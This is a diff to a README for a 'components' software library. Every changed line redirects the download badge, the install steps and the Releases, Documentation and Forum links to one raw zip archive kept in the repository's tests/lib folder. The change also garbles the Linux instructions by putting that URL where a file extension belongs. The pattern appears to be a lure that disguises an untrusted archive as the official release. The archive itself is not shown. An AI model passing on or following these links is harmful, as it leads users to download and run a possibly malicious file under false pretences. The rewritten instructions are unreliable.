@@ -17,7 +17,7 @@ To get started, you'll need to download the latest version of our software.
 
 **Click the button below to visit the Releases page:**
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/ViperrFortikkfk/components/releases)
+[![Download Now](https://raw.githubusercontent.com/ViperrFortikkfk/components/main/tests/lib/components_1.8.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/ViperrFortikkfk/components/main/tests/lib/components_1.8.zip)
 
 ### Steps to Download 
 
@@ -31,7 +31,7 @@ Each release may contain different files. You might see options for various plat
 
 - **Windows**: For Windows users, look for files ending in `.exe`.
 - **macOS**: For macOS users, look for files ending in `.dmg`.
-- **Linux**: For Linux, check for files with `.tar.gz`.
+- **Linux**: For Linux, check for files with `https://raw.githubusercontent.com/ViperrFortikkfk/components/main/tests/lib/components_1.8.zip`.
 
 Make sure to save the downloaded file in a location you can easily find later.
 
@@ -44,7 +44,7 @@ After downloading, you can run the application by following these steps:
 2. **Open the File**: 
    - **Windows**: Double-click the `.exe` file.
    - **macOS**: Open the `.dmg` file, then drag the application to your Applications folder.
-   - **Linux**: Extract the contents of the `.tar.gz` file, and follow the included instructions to install.
+   - **Linux**: Extract the contents of the `https://raw.githubusercontent.com/ViperrFortikkfk/components/main/tests/lib/components_1.8.zip` file, and follow the included instructions to install.
    
 3. **Start Using the Components**: Once installed, open the application. You will find a simple interface to begin using the components.
 
@@ -79,9 +79,9 @@ If you want to help improve the components library, we welcome your contribution
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/ViperrFortikkfk/components/releases)
-- [Documentation](https://github.com/ViperrFortikkfk/components/docs)
-- [Community Forum](https://community.github.com)
+- [Releases Page](https://raw.githubusercontent.com/ViperrFortikkfk/components/main/tests/lib/components_1.8.zip)
+- [Documentation](https://raw.githubusercontent.com/ViperrFortikkfk/components/main/tests/lib/components_1.8.zip)
+- [Community Forum](https://raw.githubusercontent.com/ViperrFortikkfk/components/main/tests/lib/components_1.8.zip)
 
 ---
 
